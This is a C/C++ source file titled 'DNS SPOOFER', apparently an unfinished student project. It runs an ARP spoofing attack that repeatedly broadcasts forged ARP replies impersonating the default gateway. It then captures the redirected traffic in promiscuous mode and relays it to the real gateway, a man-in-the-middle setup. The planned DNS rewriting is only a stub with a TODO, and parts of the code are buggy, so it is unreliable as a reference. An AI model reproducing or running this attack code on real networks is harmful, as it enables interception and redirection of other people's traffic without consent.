/*
 *                           DNS SPOOFER
 * Compilation:  gcc -Wall ./dnspoof.c -o dnspoof -lnet -lpthread
 * Usage:        ./dnspoog INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC
 * NOTE:         This program requires root privileges.
 *
 */

#include <libnet.h>

#include <pcap.h>

#include <arpa/inet.h>
#include <linux/kernel.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <linux/ip.h>
#include <linux/udp.h>

#include <unistd.h>
#include <thread>
#include <chrono>
#include <iostream>
#include <string>
#include <sstream>
#include <csignal>

libnet_t *ln;
int sfd;
char *errbuf;
pcap_t *handle;

char *interface_name;
char *address;
char *deafault_gateway_mac;
int counter  = 0;

void spoof(const char *interface_name, char *address) {
    // TODO sprawdzić czy to libnet_init można wyciągnąć przed while itp.
    u_int32_t target_ip_addr, zero_ip_addr;
    u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
            zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    struct libnet_ether_addr *src_hw_addr;
    char errbuf[LIBNET_ERRBUF_SIZE];

    ln = libnet_init(LIBNET_LINK, interface_name, errbuf);
    // Returns the MAC address for the device libnet was initialized with:
    src_hw_addr = libnet_get_hwaddr(ln);
    // Takes a dotted decimal string or a canonical DNS name and returns a network byte ordered IPv4 address:
    target_ip_addr = libnet_name2addr4(ln, address, LIBNET_RESOLVE);
    // This may incur a DNS lookup if mode is set to LIBNET_RESOLVE and host_name refers to a canonical DNS name.
    zero_ip_addr = libnet_name2addr4(ln, const_cast<char *>("0.0.0.0"), LIBNET_DONT_RESOLVE);

    libnet_autobuild_arp(
            ARPOP_REPLY,                     /* operation type       */
            src_hw_addr->ether_addr_octet,   /* sender hardware addr */ // nasz MAC
            (u_int8_t *) &target_ip_addr,     /* sender protocol addr */ // adres IP bramy
            zero_hw_addr,                    /* target hardware addr */ // dowolny MAC zapytał
            (u_int8_t *) &zero_ip_addr,       /* target protocol addr */ // -,,-
            ln);                             /* libnet context       */
    libnet_autobuild_ethernet(
            bcast_hw_addr,                   /* ethernet destination */
            ETHERTYPE_ARP,                   /* ethertype            */
            ln);                             /* libnet context       */

    while (true) {// TODO sigint
        libnet_write(ln);
        std::chrono::seconds sec = std::chrono::seconds(1);
        std::this_thread::sleep_for(sec);
    }

}

std::string getMacAddress(std::string interface_name) {
    std::stringstream mac_address;
    unsigned char mac_array[6];
    struct ifreq interface_struct;          // interface structure -> needed for interface identification
    int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));        // get socket's descriptor no
    strncpy(interface_struct.ifr_name, interface_name.c_str(), IFNAMSIZ); // read interface name and save it to interface_struct
    if (fd < 0) {
        std::cerr << "Problem in socket creation\n";
    };
    if (ioctl(fd, SIOCGIFFLAGS, &interface_struct) == 0) {
        if (ioctl(fd, SIOCGIFHWADDR, &interface_struct) == 0) {
            memcpy(mac_array, interface_struct.ifr_hwaddr.sa_data, 6);
            for (int i = 0; i < 6; i++) {
                int j = mac_array[i];
                mac_address << std::hex << j;
                if (i != 5) mac_address << ":";
            }
        }
    }
    close(fd);
    return mac_address.str();
}

std::string getIpAddress(std::string interface_name) {
    struct ifreq interface_struct;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    /* I want to get an IPv4 IP address */
    interface_struct.ifr_addr.sa_family = AF_INET;
    /* I want IP address attached to "eth0" */
    strncpy(interface_struct.ifr_name, interface_name.c_str(), IFNAMSIZ-1);
    int ret = ioctl(fd, SIOCGIFADDR, &interface_struct);
    if (ret != 0) {
        std::cerr << "Error occurs when searching for an ip!\n";
    }
    std::string ip = inet_ntoa(((struct sockaddr_in *)&interface_struct.ifr_addr)->sin_addr);
    close(fd);
    return ip;
}

std::string createFilter(char* interface_name, std::string gatewayIp) {
    std::string myMacAddress = getMacAddress(interface_name);
    std::string myIpAddress = getIpAddress(interface_name);

    std::stringstream str;
    str << "ether dst " << myMacAddress;
    // str << " and dst host " << ip;
    str << " and not dst host " << myIpAddress;
    return str.str();
}

void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
    int sfd_send;
    struct sockaddr_ll sall_send;
    struct ifreq interface_struct;          // interface structure -> needed for interface identification

    sfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    strncpy(interface_struct.ifr_name, interface_name, IFNAMSIZ);
    ioctl(sfd_send, SIOCGIFINDEX, &interface_struct);
    close(sfd_send);
    memset(&sall_send, 0, sizeof(struct sockaddr_ll));
    sall_send.sll_family = AF_PACKET;
    sall_send.sll_protocol = htons(ETH_P_ALL);
    sall_send.sll_ifindex = interface_struct.ifr_ifindex;
    sall_send.sll_hatype = ARPHRD_ETHER;
    sall_send.sll_pkttype = PACKET_OUTGOING;
    sall_send.sll_halen = ETH_ALEN;

    struct ethhdr *eth_hdr = (struct ethhdr *) frame;

    if (ntohs(eth_hdr->h_proto) == ETH_P_IP) {
        struct iphdr *ip_hdr = (struct iphdr *) (frame + sizeof(struct ethhdr));
        if (ip_hdr->protocol == 0x11) {
            struct udphdr *udp_hdr = (struct udphdr *) (ip_hdr + sizeof(struct iphdr));
            uint16_t port = ntohs(udp_hdr->dest);
            if (port == 53) { // Port 53 (DNS) TODOresult = {__be16} 0
                printf("DUPA\n");
                // TODO change query from e.g. facebook.com to wp.pl
            }
        }
    }

    // PRINT
    printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int) (h->caplen),
           eth_hdr->h_source[0], eth_hdr->h_source[1], eth_hdr->h_source[2],
           eth_hdr->h_source[3], eth_hdr->h_source[4], eth_hdr->h_source[5]);
    printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
           eth_hdr->h_dest[0], eth_hdr->h_dest[1], eth_hdr->h_dest[2],
           eth_hdr->h_dest[3], eth_hdr->h_dest[4], eth_hdr->h_dest[5]);
    printf("\n\n");

    // SEND FRAME
    // Change destination address to default gateway MAC
    sscanf(deafault_gateway_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &sall_send.sll_addr[0], &sall_send.sll_addr[1], &sall_send.sll_addr[2],
           &sall_send.sll_addr[3], &sall_send.sll_addr[4], &sall_send.sll_addr[5]);
    memcpy(eth_hdr->h_dest, &sall_send.sll_addr, ETH_ALEN);
    // Change source address to this computer MAC
    ioctl(sfd_send, SIOCGIFHWADDR, &interface_struct);
    memcpy(eth_hdr->h_source, &interface_struct.ifr_hwaddr.sa_data, ETH_ALEN);
    if (sendto(sfd_send, frame, (int) (h->caplen), 0, (struct sockaddr *) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
        printf("Error while sending: %s\n", strerror(errno));
    } else {
        printf("%d Message sent!\n", counter++);
    }

    close(sfd_send);
}

void capture(char *interface_name, char *address, char *deafault_gateway_mac) {
    bpf_u_int32 netp, maskp;
    struct bpf_program fp;
    errbuf = static_cast<char *>(malloc(PCAP_ERRBUF_SIZE));          // alloc memory for error buffer
    handle = pcap_create(interface_name, errbuf);                   // alloc for handler
    pcap_set_promisc(handle, 1); // TODO
    pcap_set_snaplen(handle, 65535);                                // frame length
    pcap_activate(handle);

    // FILTERING:
    pcap_lookupnet(interface_name, &netp, &maskp, errbuf);   // get filter args
    std::string filter = createFilter(interface_name, address);
    pcap_compile(handle, &fp, filter.c_str(), 0, netp);      // compile filter
    if (pcap_setfilter(handle, &fp) < 0) {
        pcap_perror(handle, "pcap_setfilter()");
        exit(EXIT_FAILURE);
    }
    pcap_loop(handle, -1, trap, NULL);        // run trap 
}

void stop(int signal) {
    libnet_destroy(ln);
    pcap_close(handle);
    free(errbuf);
    exit(EXIT_SUCCESS);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        std::cerr << "Bad arguments count! Arguments are: INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC\n";
        exit(EXIT_FAILURE);
    }

    interface_name = argv[1];
    address = argv[2];
    deafault_gateway_mac = argv[3];

    std::signal(SIGINT, stop);

    std::thread arp_spoofer(spoof, argv[1], argv[2]);
    std::thread capturer(capture, argv[1], argv[2], argv[3]);

    arp_spoofer.join();
    capturer.join();

    return 0;
}
